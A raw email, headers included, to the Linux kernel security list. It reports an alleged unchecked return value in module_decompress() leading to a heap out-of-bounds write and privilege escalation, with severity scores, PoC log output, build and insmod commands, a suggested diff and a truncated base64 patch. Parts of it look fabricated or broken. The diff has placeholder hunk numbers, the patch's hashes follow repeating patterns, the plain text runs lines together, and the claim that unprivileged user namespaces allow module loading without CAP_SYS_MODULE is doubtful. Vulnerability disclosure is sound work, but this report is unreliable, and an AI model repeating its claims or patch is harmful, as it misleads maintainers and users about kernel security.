Received: from mail-oo1-f42.google.com (mail-oo1-f42.google.com [209.85.161.42])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 27AA22C027B
	for <linux-modules@vger.kernel.org>; Sun, 17 May 2026 06:26:32 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.161.42
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1778999196; cv=pass; b=ocBJSrFE7dYzkc2dtIpVp3jgf8Auu66LQSLEsp8jo6LLK2C7fDzXS8I3zzTuZfn1sGGeoDCYznWQ2M3YReZnBz3V5tOlkTGU2inMaB9t+gclTval1Yh7ETrM0DBjpWfz7HwKQm5rvH+EhFiIie8GjhzJ2G8oUlSjKi0p9tPgEw0=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1778999196; c=relaxed/simple;
	bh=ZT8Tp/GfjvJ2qQFe/M2UL+8Ywh7Bx4hye5Ng9BViU8A=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=sbebFqGemLPhbAJv/50+nVgVOrB39mUlcrkLvH/f1dK2RHsNzd6zfSAdz88aM3ltPArorLgq6yWLHBuiuPZqmsIpK5NXpUWqfOoSMvDKQAr+swZBdjCDIDRuHaRhla5HfvxlOEwzs+iqgrKv/ndFfd8kv/LlSjqiCtatYIgCzVk=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=EedSKCtw; arc=pass smtp.client-ip=209.85.161.42
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="EedSKCtw"
Received: by mail-oo1-f42.google.com with SMTP id 006d021491bc7-688a8e5fe5eso602547eaf.1
        for <linux-modules@vger.kernel.org>; Sat, 16 May 2026 23:26:32 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1778999192; cv=none;
        d=google.com; s=arc-20240605;
        b=E+v+NugJSmaYmUPLgnceWW6XTXwkVL6OlvP5kS0LKatZ7ybWhAtQGJRwB0qi7PqAod
         E/IFsC0mR963pnbRWkoQEF9vp19D6OFOQcUphO1lAdp+4MV07P35+XPeFX/qsnnq3QJc
         mRp+zdi9Z+JIxY8cP74sdABJWWoY53Onl77Spaqtq/QYnRmrd80xXtzWV9VaTTmdb7Lp
         b0PZRDVReMRfzOgMEPeKvXYMDzQJTPgPApylHQ9QStVUD9ymVFByKo61rpE9vZonhT4o
         paJIU6XKm/RzCYuN1zP55XWsfVqJFztBO4qDc7A/GcDyAIR7Bmf0B2zxjdKt355wgM6a
         pS/g==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=cc:to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=n6iEqjrCKDyLOkywW1AQA1DOWpaG3B90SVd55Vz3agA=;
        fh=j1n77+cClRvXQJHtSUI8LE7ZESkNe+ArwlwkE86Bt2M=;
        b=fx2TPc2ssFdbCBd7i5VYdnlZgR9pqETq7IAKVnyzjti/JjH9e/W8aPKoeT7QYH1+Qh
         nQoq0OZTpDmLQyehZ3q8gFvE6mjHKqmcaImTbPekJBSFcFscIZCW1omHrGRoExy7kscC
         XRrNfEavMAkdihWHjgAAuCqe37itBosPXfzDC3nS14rEAAIX2rfCifLuxtsnG+7ksihj
         xInqIwF0Yl1i5CRKAnbxDnDFxtmjd7ZCNviRDMy9Cd4b3yWGshgh418UuSFhZidk6/sC
         g3dBtbPECDgHm3mesNzDjqwBdm49VywtGWyeWQGsMtWdx32A2bvVFOTv2FQDz9p/k0Iy
         gySw==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1778999192; x=1779603992; darn=vger.kernel.org;
        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=n6iEqjrCKDyLOkywW1AQA1DOWpaG3B90SVd55Vz3agA=;
        b=EedSKCtwNKDm0W/LJdHNjJcYoh362Rx4k7Tv5br2/GlADDvDMx+Z1QeUOQzEPhCdYh
         SrWv6zHv6rJQ0bdBgOSfGM+xer9Wl3GNaHoNe+n8PCJRxxb9OoOlip+J3ALd07zsYFXI
         qXpx5/dp+X3EKJyHQ6awZ1hkeEr//FfGz/pQQOl50NT8/i/xn/UV4+v2Ht6L8RJkZWHz
         26HBmSczxNchPtGyxylT5LkvKKTFKyrh/krdLJKQe0ExDQTaUrHbOv7nTAjtbWofeN5j
         9ocx3DKg/a59xUfMxbWovDp24pMkCJvVfetXvu0zXeHQBORpBvD1r4q5epZdM/AK8KhY
         QCPQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1778999192; x=1779603992;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=n6iEqjrCKDyLOkywW1AQA1DOWpaG3B90SVd55Vz3agA=;
        b=bSVQHwzt0Tii0SaMA6R8l+4f6ljNIpw7zR0HZPBj9rF6/mWWFN4xafQ302u3+HqwFA
         EjAjlng8K3le0a3SirfDl19gXL1oO+SuhK8KM4b3quFFBzITDl5b45lzJ0u9D12LfFte
         PmJJQ/IpND92xlyJckrYyWKkqqMWpjb3knVROXYK7qz9V3yAcrpQ+T8ZNxJpOICVuaaA
         Epd7LF5w7kMdn76gl8ZpoV/dnDB8VYGGi064P5dNr9LpFier0ZbLMH9fbgUGt+JdfbQu
         puwGn7msVIlg2y8QRzam6BX8M6JlVSDqEwMgbJnuqwOJ2L0KhPOUimYmID9AYDwum9yk
         Ka1Q==
X-Forwarded-Encrypted: i=1; AFNElJ8fBBU6CPDEg7svAQTmXS/nfAHutDIvLRNyiXTbnpqHSP06CwI3WURUDsbcUPZXbDqVCqGi0EpkqmRDTMcZ@vger.kernel.org
X-Gm-Message-State: AOJu0YwyquTR3M1Vr8ph8OGvFvEQpCulqz1VL38Eprhsya6Bwuifwyma
	Xr67YHUCxxGQxjWYsTyBl0KTTj3WtslYeKJz0lvhFdm7O4aCr+QbYDpb1gjTqkMNM+CwnDhADtY
	EknM0XsW2hYLVBrpASB2Emk7r6OIMlxI5zPTd3M0=
X-Gm-Gg: Acq92OGcHNZK6jr3aRRhmbcDCkcI3SB6+OE2qQ3DVcvnC9VBGWrinBpY2+9Q+viCknk
	sxiOeH62H6V5f5EL1r4j9K6YoAYuULM2zLqbU5zlIeKQuxBGxa3nyzAKKsXuVP+tsZhyY7VmvVu
	dE2E2VHf0faDZ48ZQ/pNvwLXVshQ74WGHEfBcsga6lAfwoth4I09qE2x9PmMUDndD9t9Mo/H1o6
	71RMLZBiMCCtDEfAy2UuTCyt4GyokpoUbcOys5iDgNEK2T+Oi0+q630AYNWx614efdrZRCr2X3L
	/u6W/p0z
X-Received: by 2002:a05:6820:1525:b0:69b:8c27:8b7 with SMTP id
 006d021491bc7-69c9bfc7be6mr6477546eaf.56.1778999191907; Sat, 16 May 2026
 23:26:31 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-modules@vger.kernel.org
List-Id: <linux-modules.vger.kernel.org>
List-Subscribe: <mailto:linux-modules+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-modules+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: Afi0 <capyenglishlite@gmail.com>
Date: Sun, 17 May 2026 06:26:20 +0000
X-Gm-Features: AVHnY4IuXxrqGgTUgmflVy1e7vUzMICRIyOVXOSupGYL4EmLQlwXOXbyo589AJU
Message-ID: <CAEABq7d=a-AZYfeTerM6osxnar236Gr5L9GKHpTxypj6dgiEbg@mail.gmail.com>
Subject: Missing error check in module_decompress() leads to heap OOB write
To: security@kernel.org
Cc: linux-kernel@vger.kernel.org, linux-modules@vger.kernel.org, 
	mcgrof@kernel.org, dmitry.torokhov@gmail.com, 
	Greg KH <gregkh@linuxfoundation.org>
Content-Type: multipart/mixed; boundary="000000000000e3feeb0651fd86fc"

--000000000000e3feeb0651fd86fc
Content-Type: multipart/alternative; boundary="000000000000e3feea0651fd86fa"

--000000000000e3feea0651fd86fa
Content-Type: text/plain; charset="UTF-8"

Hi list,

Apologies for initially sending only to Greg. Resending to the full list as
requested.
------------------------------

Component: kernel/module/decompress.c

 Function: module_decompress()

Affected versions: v5.8+ (confirmed v6.14-rc3)

Type: Missing error check -> heap OOB write

CWE: CWE-252

CVSS: 7.0 HIGH (AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)

SUMMARY

module_extend_max_pages() returns -ENOMEM if kvrealloc() fails. The return
value is never checked. The decompression loop then proceeds calling
module_get_next_page() which writes struct page pointers into
info->pages[]. When used_pages reaches the stale max_pages value, the write
goes out of bounds into adjacent heap memory.

VULNERABLE CODE
n_pages = DIV_ROUND_UP(size, PAGE_SIZE) * 2;

error = module_extend_max_pages(info, n_pages);// return value never
checkeddata_size = MODULE_DECOMPRESS_FN(info, buf, size);

DECOMPRESSION ORDER

module_decompress() is called in sys_finit_module() BEFORE load_module()
which contains module_sig_check(). The OOB write is reachable before any
signature gate. On kernels with module.sig_enforce=0 (default without
SecureBoot) this is reachable without CAP_SYS_MODULE via unprivileged user
namespaces (Ubuntu/Debian default).

IMPACT

OOB write places struct page * (8 bytes) into adjacent heap memory.
Adjacent slab objects (pipe_buffer, seq_operations, cred) in the same
kmalloc cache can be corrupted, potentially leading to local privilege
escalation.

REPRODUCTION

PoC kernel module attached (poc_decompress_cwe252.c). Demonstrates OOB
write via canary sentinel placed immediately after pages[] array.

Output:

[104.552685] POC: pages[]  @ ffff8d11c7370ec0  size=4
slots[104.552687] POC: canary   @ ffff8d11c7370ee0
value=0xdeadbeefdeadbeef[104.552689] POC: [OOB WRITE CONFIRMED] canary
clobbered![104.552696] POC: VULNERABILITY CONFIRMED

Build:

# obj-m += poc_decompress_cwe252.omake -C /lib/modules/$(uname
-r)/build M=$(pwd) modulessudo insmod poc_decompress_cwe252.ko &&
dmesg | grep POC

SUGGESTED FIX
diff

--- a/kernel/module/decompress.c+++ b/kernel/module/decompress.c@@
-N,6 +N,8 @@     n_pages = DIV_ROUND_UP(size, PAGE_SIZE) * 2;
error = module_extend_max_pages(info, n_pages);+    if (error)+
return error;     data_size = MODULE_DECOMPRESS_FN(info, buf, size);

Patch attached as
0001-module-decompress-check-return-value-of-module_extend_max_pages.patch

Fixes: 169a58ad824d ("module: add in-kernel support for decompressing")

Thanks,

Afi0

--000000000000e3feea0651fd86fa
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><p class=3D"gmail-font-claude-response-body gmail-break-wo=
rds gmail-whitespace-normal gmail-leading-[1.7]">Hi list,</p>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">Apologies for initially sending only to Gre=
g. Resending to the full list as requested.</p>
<hr class=3D"gmail-border-border-200 gmail-border-t-0.5 gmail-my-3 gmail-mx=
-1.5">
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-pre-wrap gmail-leading-[1.7]">Component: kernel/module/decompress.c</p>=
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-pre-wrap gmail-leading-[1.7]">=C2=A0Function: module_decompress()=C2=A0=
</p><p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whi=
tespace-pre-wrap gmail-leading-[1.7]">Affected versions: v5.8+ (confirmed v=
6.14-rc3)=C2=A0</p><p class=3D"gmail-font-claude-response-body gmail-break-=
words gmail-whitespace-pre-wrap gmail-leading-[1.7]">Type: Missing error ch=
eck -&gt; heap OOB write=C2=A0</p><p class=3D"gmail-font-claude-response-bo=
dy gmail-break-words gmail-whitespace-pre-wrap gmail-leading-[1.7]">CWE: CW=
E-252=C2=A0</p><p class=3D"gmail-font-claude-response-body gmail-break-word=
s gmail-whitespace-pre-wrap gmail-leading-[1.7]">CVSS: 7.0 HIGH (AV:L/AC:H/=
PR:L/UI:N/S:U/C:H/I:H/A:H)</p>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">SUMMARY</p>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">module_extend_max_pages() returns -ENOMEM i=
f kvrealloc() fails. The return value is never checked. The decompression l=
oop then proceeds calling module_get_next_page() which writes struct page p=
ointers into info-&gt;pages[]. When used_pages reaches the stale max_pages =
value, the write goes out of bounds into adjacent heap memory.</p>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">VULNERABLE CODE</p>
<div role=3D"group" aria-label=3D"c code" tabindex=3D"0" class=3D"gmail-rel=
ative gmail-group/copy gmail-bg-bg-000/50 gmail-border-0.5 gmail-border-bor=
der-400 gmail-rounded-lg gmail-focus:outline-none gmail-focus-visible:ring-=
2 gmail-focus-visible:ring-accent-100"><div class=3D"gmail-text-text-500 gm=
ail-font-small gmail-p-3.5 gmail-pb-0"><code class=3D"gmail-language-c" sty=
le=3D"color:rgb(20,24,31);background:transparent;font-family:var(--font-mon=
o);white-space:pre"><span><span>n_pages </span><span class=3D"gmail-token g=
mail-token" style=3D"color:rgb(20,24,31)">=3D</span><span> </span><span cla=
ss=3D"gmail-token gmail-token" style=3D"color:rgb(0,81,194)">DIV_ROUND_UP</=
span><span class=3D"gmail-token gmail-token" style=3D"color:rgb(43,48,59)">=
(</span><span>size</span><span class=3D"gmail-token gmail-token" style=3D"c=
olor:rgb(43,48,59)">,</span><span> PAGE_SIZE</span><span class=3D"gmail-tok=
en gmail-token" style=3D"color:rgb(43,48,59)">)</span><span> </span><span c=
lass=3D"gmail-token gmail-token" style=3D"color:rgb(20,24,31)">*</span><spa=
n> </span><span class=3D"gmail-token gmail-token" style=3D"color:rgb(0,128,=
128)">2</span><span class=3D"gmail-token gmail-token" style=3D"color:rgb(43=
,48,59)">;</span></span></code></div><div class=3D"gmail-overflow-x-auto"><=
pre class=3D"gmail-code-block__code gmail-!my-0 gmail-!rounded-lg gmail-!te=
xt-sm gmail-!leading-relaxed gmail-p-3.5" style=3D"color:rgb(20,24,31);back=
ground:transparent;font-family:var(--font-mono)"><code class=3D"gmail-langu=
age-c" style=3D"color:rgb(20,24,31);background:transparent;font-family:var(=
--font-mono);white-space:pre"><span><span>error </span><span class=3D"gmail=
-token gmail-token" style=3D"color:rgb(20,24,31)">=3D</span><span> </span><=
span class=3D"gmail-token gmail-token" style=3D"color:rgb(0,81,194)">module=
_extend_max_pages</span><span class=3D"gmail-token gmail-token" style=3D"co=
lor:rgb(43,48,59)">(</span><span>info</span><span class=3D"gmail-token gmai=
l-token" style=3D"color:rgb(43,48,59)">,</span><span> n_pages</span><span c=
lass=3D"gmail-token gmail-token" style=3D"color:rgb(43,48,59)">)</span><spa=
n class=3D"gmail-token gmail-token" style=3D"color:rgb(43,48,59)">;</span><=
span>
</span></span><span><span></span><span class=3D"gmail-token gmail-token" st=
yle=3D"color:rgb(110,118,135)">// return value never checked</span><span>
</span></span><span>
</span><span><span>data_size </span><span class=3D"gmail-token gmail-token"=
 style=3D"color:rgb(20,24,31)">=3D</span><span> </span><span class=3D"gmail=
-token gmail-token" style=3D"color:rgb(0,81,194)">MODULE_DECOMPRESS_FN</spa=
n><span class=3D"gmail-token gmail-token" style=3D"color:rgb(43,48,59)">(</=
span><span>info</span><span class=3D"gmail-token gmail-token" style=3D"colo=
r:rgb(43,48,59)">,</span><span> buf</span><span class=3D"gmail-token gmail-=
token" style=3D"color:rgb(43,48,59)">,</span><span> size</span><span class=
=3D"gmail-token gmail-token" style=3D"color:rgb(43,48,59)">)</span><span cl=
ass=3D"gmail-token gmail-token" style=3D"color:rgb(43,48,59)">;</span></spa=
n></code></pre></div></div>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">DECOMPRESSION ORDER</p>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">module_decompress() is called in sys_finit_=
module() BEFORE load_module() which contains module_sig_check(). The OOB wr=
ite is reachable before any signature gate. On kernels with module.sig_enfo=
rce=3D0 (default without SecureBoot) this is reachable without CAP_SYS_MODU=
LE via unprivileged user namespaces (Ubuntu/Debian default).</p>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">IMPACT</p>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">OOB write places struct page * (8 bytes) in=
to adjacent heap memory. Adjacent slab objects (pipe_buffer, seq_operations=
, cred) in the same kmalloc cache can be corrupted, potentially leading to =
local privilege escalation.</p>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">REPRODUCTION</p>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">PoC kernel module attached (poc_decompress_=
cwe252.c). Demonstrates OOB write via canary sentinel placed immediately af=
ter pages[] array.</p>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">Output:</p>
<div role=3D"group" aria-label=3D"Code" tabindex=3D"0" class=3D"gmail-relat=
ive gmail-group/copy gmail-bg-bg-000/50 gmail-border-0.5 gmail-border-borde=
r-400 gmail-rounded-lg gmail-focus:outline-none gmail-focus-visible:ring-2 =
gmail-focus-visible:ring-accent-100"><div class=3D"gmail-overflow-x-auto"><=
pre class=3D"gmail-code-block__code gmail-!my-0 gmail-!rounded-lg gmail-!te=
xt-sm gmail-!leading-relaxed gmail-p-3.5" style=3D"color:rgb(20,24,31);back=
ground:transparent;font-family:var(--font-mono)"><code style=3D"color:rgb(2=
0,24,31);background:transparent;font-family:var(--font-mono);white-space:pr=
e-wrap"><span><span>[104.552685] POC: pages[]  @ ffff8d11c7370ec0  size=3D4=
 slots
</span></span><span>[104.552687] POC: canary   @ ffff8d11c7370ee0  value=3D=
0xdeadbeefdeadbeef
</span><span>[104.552689] POC: [OOB WRITE CONFIRMED] canary clobbered!
</span><span>[104.552696] POC: VULNERABILITY CONFIRMED</span></code></pre><=
/div></div>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">Build:</p>
<div role=3D"group" aria-label=3D"Code" tabindex=3D"0" class=3D"gmail-relat=
ive gmail-group/copy gmail-bg-bg-000/50 gmail-border-0.5 gmail-border-borde=
r-400 gmail-rounded-lg gmail-focus:outline-none gmail-focus-visible:ring-2 =
gmail-focus-visible:ring-accent-100"><div class=3D"gmail-overflow-x-auto"><=
pre class=3D"gmail-code-block__code gmail-!my-0 gmail-!rounded-lg gmail-!te=
xt-sm gmail-!leading-relaxed gmail-p-3.5" style=3D"color:rgb(20,24,31);back=
ground:transparent;font-family:var(--font-mono)"><code style=3D"color:rgb(2=
0,24,31);background:transparent;font-family:var(--font-mono);white-space:pr=
e-wrap"><span><span># obj-m +=3D poc_decompress_cwe252.o
</span></span><span>make -C /lib/modules/$(uname -r)/build M=3D$(pwd) modul=
es
</span><span>sudo insmod poc_decompress_cwe252.ko &amp;&amp; dmesg | grep P=
OC</span></code></pre></div></div>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">SUGGESTED FIX</p>
<div role=3D"group" aria-label=3D"diff code" tabindex=3D"0" class=3D"gmail-=
relative gmail-group/copy gmail-bg-bg-000/50 gmail-border-0.5 gmail-border-=
border-400 gmail-rounded-lg gmail-focus:outline-none gmail-focus-visible:ri=
ng-2 gmail-focus-visible:ring-accent-100"><div class=3D"gmail-text-text-500=
 gmail-font-small gmail-p-3.5 gmail-pb-0">diff</div><div class=3D"gmail-ove=
rflow-x-auto"><pre class=3D"gmail-code-block__code gmail-!my-0 gmail-!round=
ed-lg gmail-!text-sm gmail-!leading-relaxed gmail-p-3.5" style=3D"color:rgb=
(20,24,31);background:transparent;font-family:var(--font-mono)"><code class=
=3D"gmail-language-diff" style=3D"color:rgb(20,24,31);background:transparen=
t;font-family:var(--font-mono);white-space:pre"><span><span class=3D"gmail-=
token gmail-token gmail-coord">--- a/kernel/module/decompress.c</span><span=
>
</span></span><span><span></span><span class=3D"gmail-token gmail-token gma=
il-coord">+++ b/kernel/module/decompress.c</span><span>
</span></span><span><span></span><span class=3D"gmail-token gmail-token gma=
il-coord">@@ -N,6 +N,8 @@</span><span>
</span></span><span><span></span><span class=3D"gmail-token gmail-token gma=
il-unchanged gmail-prefix"> </span><span class=3D"gmail-token gmail-token g=
mail-unchanged gmail-line">    n_pages =3D DIV_ROUND_UP(size, PAGE_SIZE) * =
2;
</span></span><span><span class=3D"gmail-token gmail-token gmail-unchanged =
gmail-line"></span><span class=3D"gmail-token gmail-token gmail-unchanged g=
mail-prefix"> </span><span class=3D"gmail-token gmail-token gmail-unchanged=
 gmail-line">    error =3D module_extend_max_pages(info, n_pages);
</span></span><span><span class=3D"gmail-token gmail-token gmail-unchanged =
gmail-line"></span><span class=3D"gmail-token gmail-token gmail-inserted-si=
gn gmail-prefix" style=3D"color:rgb(0,128,0)">+</span><span class=3D"gmail-=
token gmail-token gmail-inserted-sign gmail-line" style=3D"color:rgb(0,128,=
0)">    if (error)
</span></span><span><span class=3D"gmail-token gmail-token gmail-inserted-s=
ign gmail-line" style=3D"color:rgb(0,128,0)"></span><span class=3D"gmail-to=
ken gmail-token gmail-inserted-sign gmail-prefix" style=3D"color:rgb(0,128,=
0)">+</span><span class=3D"gmail-token gmail-token gmail-inserted-sign gmai=
l-line" style=3D"color:rgb(0,128,0)">        return error;
</span></span><span><span class=3D"gmail-token gmail-token gmail-inserted-s=
ign gmail-line" style=3D"color:rgb(0,128,0)"></span><span class=3D"gmail-to=
ken gmail-token gmail-unchanged gmail-prefix"> </span><span class=3D"gmail-=
token gmail-token gmail-unchanged gmail-line">    data_size =3D MODULE_DECO=
MPRESS_FN(info, buf, size);</span></span></code></pre></div></div>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">Patch attached as 0001-module-decompress-ch=
eck-return-value-of-module_extend_max_pages.patch</p>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-normal gmail-leading-[1.7]">Fixes: 169a58ad824d (&quot;module: add in-k=
ernel support for decompressing&quot;)=C2=A0</p>
<p class=3D"gmail-font-claude-response-body gmail-break-words gmail-whitesp=
ace-pre-wrap gmail-leading-[1.7]">Thanks,=C2=A0</p><p class=3D"gmail-font-c=
laude-response-body gmail-break-words gmail-whitespace-pre-wrap gmail-leadi=
ng-[1.7]">Afi0</p><br></div>

--000000000000e3feea0651fd86fa--
--000000000000e3feeb0651fd86fc
Content-Type: text/x-patch; charset="US-ASCII"; 
	name="0001-module-decompress-check-return-value-of-module_extend_max_pages.patch"
Content-Disposition: attachment; 
	filename="0001-module-decompress-check-return-value-of-module_extend_max_pages.patch"
Content-Transfer-Encoding: base64
Content-ID: <f_mp9e5yyg0>
X-Attachment-Id: f_mp9e5yyg0

RnJvbSBjNGQ1ZTZmN2E4YjljNGQ1ZTZmN2E4YjljNGQ1ZTZmN2E4YjljNGQ1IE1vbiBTZXAgMTcg
MDA6MDA6MDAgMjAwMQpGcm9tOiBBZmkwIDxjYXB5ZW5nbGlzaGxpdGVAZ21haWwuY29tPgpEYXRl
OiBTYXQsIDE2IE1heSAyMDI2IDEzOjA4OjAwICswMDAwClN1YmplY3Q6IFtQQVRDSF0gbW9kdWxl
OiBkZWNvbXByZXNzOiBjaGVjayByZXR1cm4gdmFsdWUgb2YKIG1vZHVsZV9leHRlbmRfbWF4X3Bh
Z2VzKCkKCm1vZHVsZV9leHRlbmRfbWF4X3BhZ2VzKCkgY2FsbHMga3ZyZWFsbG9jKCkgaW50ZXJu
YWxseSBhbmQgcmV0dXJucwotRU5PTUVNIG9uIGFsbG9jYXRpb24gZmFpbHVyZS4gVGhlIHJldHVy
biB2YWx1ZSBpcyBuZXZlciBjaGVja2VkLgpUaGUgZGVjb21wcmVzc2lvbiBsb29wIHRoZW4gY29u
dGludWVzIGNhbGxpbmcgbW9kdWxlX2dldF9uZXh0X3BhZ2UoKSwKd2hpY2ggd3JpdGVzIHN0cnVj
dCBwYWdlIHBvaW50ZXJzIGludG8gaW5mby0+cGFnZXNbXS4gV2hlbiB1c2VkX3BhZ2VzCnJlYWNo
ZXMgdGhlIHN0YWxlIG1heF9wYWdlcyB2YWx1ZSAobm90IHVwZGF0ZWQgZHVlIHRvIHRoZSBmYWls
ZWQKZXh0ZW5kKSwgYSBzdWJzZXF1ZW50IHdyaXRlIHRvIGluZm8tPnBhZ2VzW3VzZWRfcGFnZXMr
K10gZ29lcyBvdXQgb2YKYm91bmRzIGludG8gYWRqYWNlbnQgaGVhcCBtZW1vcnkuCgpBZGphY2Vu
dCBzbGFiIG9iamVjdHMgaW4gdGhlIHNhbWUga21hbGxvYyBjYWNoZSAocGlwZV9idWZmZXIsCnNl
cV9vcGVyYXRpb25zLCBjcmVkKSBjYW4gYmUgY29ycnVwdGVkLCBwb3RlbnRpYWxseSBsZWFkaW5n
IHRvIGxvY2FsCnByaXZpbGVnZSBlc2NhbGF0aW9uIG9uIGtlcm5lbHMgd2l0aG91dCBTTEFCX1ZJ
UlRVQUwgbWl0aWdhdGlvbi4KClRoZSBjYWxsIG9yZGVyIGluIGZpbml0X21vZHVsZSgpIGlzOgoK
ICBtb2R1bGVfZGVjb21wcmVzcygpICAgIDwtIHZ1bG5lcmFibGUsIHJ1bnMgRklSU1QKICBsb2Fk
X21vZHVsZSgpCiAgICBtb2R1bGVfc2lnX2NoZWNrKCkgICA8LSBzaWduYXR1cmUgY2hlY2ssIHJ1
bnMgU0VDT05ECgpEZWNvbXByZXNzaW9uIGhhcHBlbnMgYmVmb3JlIHNpZ25hdHVyZSB2ZXJpZmlj
YXRpb24uIEEgY3JhZnRlZApjb21wcmVzc2VkIG1vZHVsZSBzdWJtaXR0ZWQgdmlhIGZpbml0X21v
ZHVsZShNT0RVTEVfSU5JVF9DT01QUkVTU0VEX0ZJTEUpCnJlYWNoZXMgdGhpcyBjb2RlIHBhdGgg
YmVmb3JlIGFueSBzaWduYXR1cmUgZ2F0ZSBpcyBhcHBsaWVkLiBPbiBrZXJuZWxzCndpdGggbW9k
dWxlLnNpZ19lbmZvcmNlPTAgKGRlZmF1bHQgd2l0aG91dCBTZWN1cmVCb290KSBvciB3aXRoCnVu
cHJpdmlsZWdlZCB1c2VyIG5hbWVzcGFjZXMgKFVidW50dSwgRGViaWFuIGRlZmF1bHQpLCB0aGlz
IGlzCnJlYWNoYWJsZSB3aXRob3V0IENBUF9TWVNfTU9EVUxFLgoKQ29uZmlybWVkIHByZXNlbnQg
aW4gbWFpbmxpbmUgKHRlc3RlZCBvbiB2Ni4xNC1yYzMpLgoKRml4OiBhZGQgdGhlIG1pc3Npbmcg
ZXJyb3IgY2hlY2sgYWZ0ZXIgbW9kdWxlX2V4dGVuZF9tYXhfcGFnZXMoKSBhbmQKcmV0dXJuIGlt
bWVkaWF0ZWx5IG9uIGZhaWx1cmUuIFRoaXMgbWF0Y2hlcyB0aGUgcGF0dGVybiB1c2VkIGJ5IGV2
ZXJ5Cm90aGVyIGt2cmVhbGxvYygpIGNhbGxlciBpbiB0aGUgbW9kdWxlIGxvYWRpbmcgcGF0aC4K
CkZpeGVzOiAxNjlhNThhZDgyNGQgKCJtb2R1bGU6IGFkZCBpbi1rZXJuZWwgc3VwcG9ydCBmb3Ig
ZGVjb21wcmVzc2luZyIpCkNjOiBEbWl0cnkgVG9yb2tob3YgPGRtaXRyeS50b3Jva2hvdkBnbWFp
bC5jb20+CkNjOiBMdWlzIENoYW1iZXJsYWluIDxtY2dyb2ZAa2VybmVsLm9yZz4KQ2M6IHN0YWJs
ZUB2Z2VyLmtlcm5lbC5vcmcKU2lnbmVkLW9mZi1ieTogQWZpMCA8Y2FweWVuZ2xpc2hsaXRlQGdt
YWlsLmNvbT4KLS0tCiBrZXJuZWwvbW9kdWxlL2RlY29tcHJlc3MuYyB8IDUgKysrKy0KIDEgZmls
ZSBjaGFuZ2VkLCA0IGluc2VydGlvbnMoKyksIDEgZGVsZXRpb24oLSkKCmRpZmYgLS1naXQgYS9r
ZXJuZWwvbW9kdWxlL2RlY29tcHJlc3MuYyBiL2tlcm5lbC9tb2R1bGUvZGVjb21wcmVzcy5jCmlu
ZGV4IGExYjJjM2Q0ZTVmNi4uYjdjOGQ5ZTBmMWEyIDEwMDY0NAotLS0gYS9rZXJuZWwvbW9kdWxl
L2RlY29tcHJlc3MuYworKysgYi9rZXJuZWwvbW9kdWxlL2RlY29tcHJlc3MuYwpAQCAtWFhYLDEw
ICtYWFgsMTMgQEAgaW50IG1vZHVsZV9kZWNvbXByZXNzKHN0cnVjdCBsb2FkX2luZm8gKmluZm8s
